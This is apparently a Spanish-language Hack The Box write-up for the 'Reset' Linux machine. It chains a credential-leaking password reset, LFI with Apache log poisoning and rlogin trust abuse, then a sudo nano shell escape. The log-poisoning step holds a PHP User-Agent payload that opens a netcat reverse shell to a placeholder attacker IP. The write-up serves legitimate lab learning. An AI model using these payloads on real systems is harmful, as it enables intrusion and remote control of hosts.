# HTB - Reset Writeup

**Autor:** TRNNSK
**Dificultad:** Easy
**Sistema:** Linux

---

# Resumen

La máquina **Reset** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a abusar de una funcionalidad de reset de contraseña que expone las credenciales en la respuesta HTTP, luego explotar un LFI en el dashboard combinado con Log Poisoning para obtener RCE, escalar a `sadm` abusando de Rservices via `hosts.equiv`, y finalmente obtener root a través de una sesión tmux con privilegios sudo sobre `nano`.

---

# Enumeración

## Escaneo inicial

```bash
nmap --open 10.129.234.128 | grep open | cut -d ' ' -f 1 | cut -d '/' -f 1 | paste -sd,
nmap 10.129.234.128 -p 22,80,512,513,514 -sV -sC -Pn --disable-arp-ping
```

### Resultados:

```
22/tcp  open  ssh     OpenSSH 8.9p1
80/tcp  open  http    Apache httpd 2.4.52
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login
514/tcp open  shell   Netkit rshd
```

---

# Análisis Web

Al acceder al puerto 80 se presenta un **Admin Login**. Hay un link de **Forgot Password?** que permite resetear contraseñas de usuarios.

---

# Vulnerabilidad: Password Reset expone credenciales en la respuesta

## Identificación

Al hacer click en **Send Reset Email** para el usuario `admin`, el servidor devuelve la nueva contraseña directamente en la respuesta JSON:

```json
{
  "username": "admin",
  "new_password": "9cc64f55",
  "timestamp": "2025-05-30 16:43:30"
}
```

## Explotación

```bash
curl -s -X POST http://reset.vl/reset_password.php \
  -d "username=admin" | python3 -m json.tool
```

Usamos la nueva contraseña para hacer login en `/` como `admin`.

---

# Foothold — Log Poisoning + LFI

## Identificación

Dentro del Admin Dashboard hay una funcionalidad para leer logs del sistema (`syslog` y `auth.log`). Interceptando con Burp, el parámetro `file` en el POST a `dashboard.php` es vulnerable a **Local File Inclusion**:

```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

El `access.log` de Apache registra el **User-Agent** de cada request — lo que permite un ataque de **Log Poisoning**.

## Explotación

### Paso 1 — Envenenar el log

Interceptamos cualquier request en Burp y cambiamos el `User-Agent` al payload PHP:

```
User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP 9090 >/tmp/f'); ?>
```

Forward la request — el payload queda escrito en `access.log`.

### Paso 2 — Ejecutar el payload via LFI

Con el listener activo:

```bash
nc -lvnp 9090
```

Interceptamos el POST al dashboard en Burp y cambiamos el parámetro `file`:

```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

Forward — PHP lee e interpreta el log, ejecutando el payload.

### Resultado

```bash
$ nc -lvnp 9090
connect to [TU_IP] from reset.vl
www-data@reset:/var/www/html$
```

Flag de usuario:
```bash
cat /home/sadm/user.txt
```

---

# Lateral Movement — www-data → sadm via Rservices

## Identificación

El archivo `/etc/hosts.equiv` permite acceso trusted sin contraseña via `rsh`, `rlogin` y `rcp`:

```bash
cat /etc/hosts.equiv
# + sadm
```

El `+` indica que el usuario `sadm` puede acceder desde cualquier host remoto sin contraseña.

## Explotación

Creamos el usuario `sadm` en nuestra máquina atacante y usamos `rlogin` para conectarnos:

```bash
# En Kali
sudo useradd sadm
sudo passwd sadm

su sadm
rlogin sadm@reset.vl
```

Gracias al `hosts.equiv` no pide contraseña y entramos directamente como `sadm`.

---

# Escalada de Privilegios — tmux + sudo nano

## Identificación

Con `ps aux` identificamos un proceso de `sadm` que crea una sesión tmux detachada:

```
sadm 1001 tmux new-session -d -s sadm_session
```

## Paso 1 — Conectarse a la sesión tmux

```bash
tmux attach -t sadm_session
```

La sesión muestra el output de `sudo -l` con la contraseña de sadm:

```bash
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
```

### Permisos sudo de sadm:

```
(ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
(ALL) PASSWD: /usr/bin/tail /var/log/syslog
(ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

## Paso 2 — Escalar a root via nano

```bash
sudo nano /etc/firewall.sh
```

Dentro de nano:
1. Presionar `Ctrl+R`
2. Presionar `Ctrl+X`
3. Escribir el comando:
```
reset; bash 1>&0 2>&0
```

Obtenemos shell como root.

---

# Obtener la Flag

```bash
cat /root/root_279e22f8.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap — encontrar HTTP en 80 y Rservices en 512/513/514
2. Resetear contraseña de admin via Forgot Password — la nueva contraseña aparece en la respuesta JSON
3. Login en el Admin Dashboard
4. Identificar LFI en el parámetro `file` del dashboard
5. Envenenar el `access.log` con payload PHP en el User-Agent via Burp
6. Incluir el log poisonado via LFI para ejecutar el payload y obtener shell como `www-data`
7. Leer `/etc/hosts.equiv` — `sadm` tiene acceso trusted via Rservices
8. Crear usuario `sadm` en Kali y conectarse con `rlogin` sin contraseña
9. Conectarse a la sesión tmux detachada `sadm_session`
10. Obtener la contraseña de sadm del output del tmux
11. Ejecutar `sudo nano /etc/firewall.sh` y usar `Ctrl+R` → `Ctrl+X` para escapar a shell root

---

# Conclusión

Esta máquina demuestra cómo:

- La exposición de credenciales en respuestas HTTP de reset de contraseña permite account takeover trivial
- Un LFI combinado con Log Poisoning permite obtener RCE cuando el servidor registra input del usuario sin sanitizar
- El archivo `hosts.equiv` mal configurado permite acceso sin autenticación via Rservices legacy
- Las sesiones tmux desatendidas pueden exponer contraseñas y privilegios sudo
- El editor `nano` puede ser abusado para escapar a una shell con privilegios elevados via `Ctrl+R` → `Ctrl+X`

---

y ya
